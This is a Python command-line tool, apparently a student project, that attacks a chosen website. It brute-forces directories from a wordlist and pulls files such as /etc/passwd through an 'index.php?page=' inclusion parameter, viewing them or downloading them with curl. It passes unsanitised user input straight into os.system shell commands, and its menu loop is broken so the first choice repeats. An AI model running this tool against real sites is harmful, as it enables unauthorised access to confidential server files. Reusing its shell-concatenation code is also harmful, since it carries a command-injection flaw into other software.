import os
import requests

# READ IN DIRECTORY LIBRARY FILE & SAVE AS LIST
data = open("dir_list.txt", "r")
datastring = data.read()
dirlist = datastring.split("\n")

# --- VARS ---

indexref = "index.php?page="
currentdir = ""
menuoptions = 8 #including exit

# ---- FUNCTIONS ----

def visitpage(command):
	os.system("xdg-open " + command)

def download(url):
	os.system("curl -O " + url)

def pageexists(url):
	request = requests.get(url)
	if (request.status_code != 404):
		return "true"
	else:
		return "false"

def appendslash(url):
	if (url.endswith("/") == False):
		url = url + "/"
	return url

# ---- MENU ----

print("\n\n====== Deakin Detonator Directory Traversal Fuzzer Tool ======\n")
selection = 0
homepage = input("Enter homepage of targeted webpage >> ")
print(homepage)
homepage = appendslash(homepage)
print(homepage)
currentdir = homepage
isint = False

while (selection != 8):
	print("\n----------------------------\n")
	print("What would you like to do?\n")
	print("1: Access homepage")
	print("2: Change targeted site homepage")
	print("3: Scan for open directories on webserver using library")
	print("4: Scan for custom directory")
	print("5: Access custom directory")
	print("6: Access directory within webserver index via object reference manipulation (IDOR)")
	print("7: Download file")
	print("8: Exit Tool\n")
	
	while (isint == False):
		try:
			selection = int(input("Select an option >> "))
			if (selection >= 1 and selection <= menuoptions):
				isint = True
			else:
				print("Please enter valid selection between 1 and " + str(menuoptions) + " ...\n")
		except ValueError:
			print("Please enter valid selection between 1 and " + str(menuoptions) + " ...\n")



	if (selection == 1):
		visitpage(homepage)

	elif (selection == 2):
		homepage = input("Enter homepage of targeted webpage >> ")
		currentdir = homepage

	elif (selection == 3):
		print("\n**** Scanning for open directories using directory library ****\n")
		truepages = 0		
		falsepages = 0
		for directory in dirlist:
			if (pageexists(homepage + directory) == "true"):
				print("FOUND: " + homepage + directory)
				truepages += 1
			else:
				falsepages += 1
		print("\n" + str(truepages) + " directories FOUND on "
			 + homepage + " and listed above")
		print(str(falsepages) + " directories NOT FOUND on " 
			+ homepage + " from library\n")

	elif (selection == 4):
		print("\nEnter directory to scan for...")
		directory = input("http://homepage/ >> ")
		if (pageexists(homepage + directory) == "true"):
			print("\nDirectory exists on webserver! \n\t" 
					+ homepage + directory + "\n")
		else:
			print("\nError: Could not find directory. \n\t"
					+ homepage + directory + "\n")
		
	elif (selection == 5):
		print("\nWhich directory would you like to access?")
		directory = input("http://homepage/ >> ")
		visitpage(homepage + directory)
		print()

	elif (selection == 6):
		print("\nEnter directory within the site's index to visit...")
		print("!! HINT: 'robots' text file and /etc/passwd often contain confidential informaiton!!")
		filepath = input("http://homepage/index.php?page= >> ")
		visitpage(homepage + indexref + filepath)

	elif (selection == 7):
		print("\nEnter file (including path) to download...")
		filepath = input("http://homepage/ >> ")
		download(homepage + indexref + filepath)
		print()

	elif (selection == 8):
		break

	else:
		print("Please enter a valid option...")


	input("Press enter to continue...")


				
			


		
	


